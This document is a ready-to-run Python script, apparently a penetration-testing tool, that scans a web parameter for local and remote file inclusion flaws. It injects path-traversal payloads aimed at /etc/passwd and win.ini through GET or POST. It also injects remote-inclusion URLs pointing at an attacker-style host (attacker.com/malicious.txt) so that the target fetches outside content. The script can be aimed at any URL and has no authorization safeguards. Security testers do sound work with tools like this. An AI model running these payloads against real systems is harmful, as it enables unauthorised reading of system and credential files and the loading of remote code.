import requests
import argparse
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

# Common LFI and RFI payloads
lfi_payloads = [
    '/etc/passwd',
    '../../../../../etc/passwd',
    '../../../../../../etc/passwd',
    '../../../../../../../../etc/passwd',
    '../../../../../../../../../../etc/passwd',
    'C:\\windows\\win.ini',
    '..\\..\\..\\..\\..\\windows\\win.ini',
]

rfi_payloads = [
    'http://example.com/shell.txt',  # You can replace with your own URL hosting a test file
    'http://attacker.com/malicious.txt'
]

def inject_payload_get(url, param, payload):
    parsed_url = urlparse(url)
    query_params = dict(parse_qsl(parsed_url.query))
    query_params[param] = payload
    new_query = urlencode(query_params, doseq=True)
    new_url = urlunparse(parsed_url._replace(query=new_query))
    return new_url

def test_lfi_rfi_get(url, param):
    vulnerable_found = False
    print("[*] Testing LFI payloads (GET)...")
    for payload in lfi_payloads:
        test_url = inject_payload_get(url, param, payload)
        try:
            resp = requests.get(test_url, timeout=10)
            if 'root:' in resp.text or '[extensions]' in resp.text or 'daemon:' in resp.text or '[fonts]' in resp.text:
                print(f"[+] Possible LFI vulnerability found with payload: {payload}")
                print(f"URL: {test_url}\nStatus Code: {resp.status_code}\n")
                vulnerable_found = True
            else:
                print(f"[-] LFI payload not successful: {payload}")
        except Exception as e:
            print(f"Request failed for payload {payload}: {e}")

    print("[*] Testing RFI payloads (GET)...")
    for payload in rfi_payloads:
        test_url = inject_payload_get(url, param, payload)
        try:
            resp = requests.get(test_url, timeout=10)
            if 'shell' in resp.text.lower() or 'malicious' in resp.text.lower():
                print(f"[+] Possible RFI vulnerability found with payload: {payload}")
                print(f"URL: {test_url}\nStatus Code: {resp.status_code}\n")
                vulnerable_found = True
            else:
                print(f"[-] RFI payload not successful: {payload}")
        except Exception as e:
            print(f"Request failed for payload {payload}: {e}")
    if not vulnerable_found:
        print("[-] No LFI or RFI vulnerabilities detected.")
    return vulnerable_found

def test_lfi_rfi_post(url, param, data):
    vulnerable_found = False
    print("[*] Testing LFI payloads (POST)...")
    for payload in lfi_payloads:
        post_data = data.copy()
        post_data[param] = payload
        try:
            resp = requests.post(url, data=post_data, timeout=10)
            if 'root:' in resp.text or '[extensions]' in resp.text or 'daemon:' in resp.text or '[fonts]' in resp.text:
                print(f"[+] Possible LFI vulnerability found with payload: {payload}")
                print(f"POST data: {post_data}\nStatus Code: {resp.status_code}\n")
                vulnerable_found = True
            else:
                print(f"[-] LFI payload not successful: {payload}")
        except Exception as e:
            print(f"Request failed for payload {payload}: {e}")

    print("[*] Testing RFI payloads (POST)...")
    for payload in rfi_payloads:
        post_data = data.copy()
        post_data[param] = payload
        try:
            resp = requests.post(url, data=post_data, timeout=10)
            if 'shell' in resp.text.lower() or 'malicious' in resp.text.lower():
                print(f"[+] Possible RFI vulnerability found with payload: {payload}")
                print(f"POST data: {post_data}\nStatus Code: {resp.status_code}\n")
                vulnerable_found = True
            else:
                print(f"[-] RFI payload not successful: {payload}")
        except Exception as e:
            print(f"Request failed for payload {payload}: {e}")

    if not vulnerable_found:
        print("[-] No LFI or RFI vulnerabilities detected.")
    return vulnerable_found

def parse_post_data(data_str):
    data = {}
    for pair in data_str.split('&'):
        if '=' in pair:
            k,v = pair.split('=',1)
            data[k] = v
        else:
            data[pair] = ''
    return data

def main():
    parser = argparse.ArgumentParser(description="LFI/RFI Vulnerability Scanner")
    parser.add_argument('url', help='Target URL (e.g., http://example.com/vuln.php?file=)')
    parser.add_argument('param', help='Parameter name to test for LFI/RFI')
    parser.add_argument('--method', choices=['GET', 'POST'], default='GET', help='HTTP method to use')
    parser.add_argument('--data', help='POST data parameters (key=value&key2=value2), required for POST')

    args = parser.parse_args()

    if args.method == 'POST':
        if not args.data:
            print("[-] POST method requires --data argument")
            return
        post_data = parse_post_data(args.data)
        test_lfi_rfi_post(args.url, args.param, post_data)
    else:
        test_lfi_rfi_get(args.url, args.param)

if __name__ == "__main__":
    main()
